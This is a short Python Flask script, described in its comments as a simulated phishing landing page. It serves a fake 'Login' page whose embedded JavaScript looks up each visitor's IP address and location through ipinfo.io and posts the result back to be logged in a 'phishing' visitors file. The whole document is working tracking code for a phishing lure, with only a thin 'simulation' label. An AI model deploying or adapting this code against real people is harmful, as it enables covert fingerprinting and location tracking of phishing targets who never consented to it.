 # Log visitor info (IP, browser, location)
# These tools will simulate a phishing landing page with basic device fingerprinting and logging.
#!/usr/bin/env python3
from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

log_file = "phishing/visitors.log"

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
</head>
<body>
  <h1>Welcome</h1>
  <script>
    fetch("https://ipinfo.io/json")
      .then(res => res.json())
      .then(data => {
        fetch("/log", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(data)
        });
      });
  </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_PAGE)

@app.route("/log", methods=["POST"])
def log():
    data = request.get_json()
    with open(log_file, "a") as f:
        f.write(f"{datetime.datetime.now()} - {request.remote_addr} - {data}\n")
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
